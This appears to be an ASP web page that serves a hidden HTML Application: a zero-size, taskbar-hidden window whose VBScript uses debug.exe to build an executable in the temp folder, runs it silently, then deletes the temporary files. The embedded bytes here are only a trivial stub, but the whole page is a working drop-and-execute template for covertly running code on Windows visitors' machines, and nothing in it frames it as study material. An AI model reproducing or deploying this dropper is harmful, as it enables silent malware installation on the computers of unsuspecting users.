<%Response.ContentType="Application/Hta"%>
<html><head>
<hta:application height="0" width="0" caption="no" border="none" showintaskbar="no">
<script language="JavaScript">
window.moveTo(0,0);
window.resizeTo(0,0);
</script>
<script language="VBScript">
Set WSHshell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
fn_tmp = fs.GetSpecialFolder(2) & "\" & Right(fs.GetTempName, 8)
fn_com = Replace(LCase(fn_tmp), ".tmp", ".com")
fn_exe = Replace(LCase(fn_tmp), ".tmp", ".exe")
Set a = fs.CreateTextFile(fn_tmp, True)
a.Write "e100 90 90 90 C3" & vbCrLf
a.Write "rcx" & vbCrLf
a.Write "4" & vbCrLf
a.Write "n " & fn_com & vbCrLf
a.Write "w" & vbCrLf
a.Write "q" & vbCrLf
a.Close
WSHshell.Run "cmd.exe /c debug.exe<" & fn_tmp, 0, 1
If fs.FileExists(fn_com) Then
    fs.CopyFile fn_com, fn_exe, True
    WSHshell.Run fn_exe, 0, 0
End If
fs.DeleteFile fn_tmp, True
fs.DeleteFile fn_com, True
window.close
</script>
</head><body></body></html>
